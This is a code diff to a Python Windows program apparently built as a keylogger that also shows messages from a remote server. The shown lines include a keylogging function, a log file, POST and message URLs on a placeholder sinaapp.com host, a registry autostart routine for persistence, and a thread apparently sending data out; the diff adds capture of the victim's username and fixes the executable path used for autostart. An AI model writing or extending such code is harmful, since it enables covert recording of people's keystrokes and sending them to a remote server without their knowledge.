@@ -11,6 +11,7 @@
 import os
 import sys
 import time
+import getpass
 import thread
 import urllib
 import requests
@@ -33,6 +34,13 @@ filename = 'log.txt'
 POST_URL = 'http://xxxx.sinaapp.com/action.jsp'
 MSG_URL = 'http://xxxx.sinaapp.com/msgbox.txt'
 tittle = u'消息啦'
+
+def get_user():
+	global client_id
+	try:
+		client_id = getpass.getuser()
+	except:
+		pass
 
 def showmsg(user,text):
 	global old
@@ -111,8 +119,8 @@ def keyloger():
 	pythoncom.PumpMessages()
 
 def getPath():
-    path=os.getcwd()+'\keyloger_and_msg.exe'
-    return path
+	path = os.path.abspath(sys.argv[0])
+	return path
 	
 def add_start(path):
 	try: #using the 'KEY_ALL_ACCESS',so please running with administrator
@@ -122,7 +130,8 @@ def add_start(path):
 	except:
 		pass
 	
-if __name__=='__main__':		
+if __name__=='__main__':
+	get_user()
 	add_start(getPath())
 	thread.start_new_thread(http_data,())
 	time.sleep(1)
